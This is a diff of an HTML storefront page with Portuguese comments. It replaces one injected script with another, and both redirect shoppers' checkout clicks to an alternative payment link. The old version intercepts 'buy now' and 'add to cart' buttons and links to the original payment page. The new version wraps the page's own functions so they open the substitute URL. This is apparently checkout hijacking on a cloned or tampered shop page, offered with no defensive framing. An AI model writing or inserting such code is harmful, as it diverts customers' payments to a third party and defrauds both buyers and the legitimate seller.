@@ -46,26 +46,26 @@
     <!-- App React -->
     <div id="root"></div>
 <script>
-document.addEventListener("click", (e) => {
-  // Pega o elemento clicado ou pai mais próximo com role="button" ou <a>/<button>
-  const el = e.target.closest("a, button, [role='button']");
-  if (!el) return;
+window.addEventListener("load", () => {
+  // Aguarda o React montar as funções
+  if (typeof window.o === "function") {
+    const originalO = window.o;
+    window.o = function() {
+      window.open("https://pay.local-protegido.online/z0qn35de8jKg98m", "_blank");
+      originalO(); // opcional: se você quiser chamar a função original (ex: fechar modal)
+    }
+  }
 
-  // Extrai link se existir
-  const href = el.getAttribute("href") || el.dataset.href || "";
-
-  // Detecta se é o botão do checkout original
-  const isOriginalCheckout = href.includes("pay.lojaseguraoficial.lat/5pjw3RnDRYm32lQ") ||
-                             el.innerText.toLowerCase().includes("comprar agora") ||
-                             el.innerText.toLowerCase().includes("adicionar ao carrinho");
-
-  if (!isOriginalCheckout) return;
-
-  e.preventDefault(); // evita abrir o link original
-  // Redireciona para o seu link personalizado
-  window.open("https://pay.local-protegido.online/z0qn35de8jKg98m", "_blank");
+  if (typeof window.a === "function") {
+    const originalA = window.a;
+    window.a = function() {
+      window.open("https://pay.local-protegido.online/z0qn35de8jKg98m", "_blank");
+      originalA(); // opcional
+    }
+  }
 });
 </script>
+
 
   </body>
 </html>
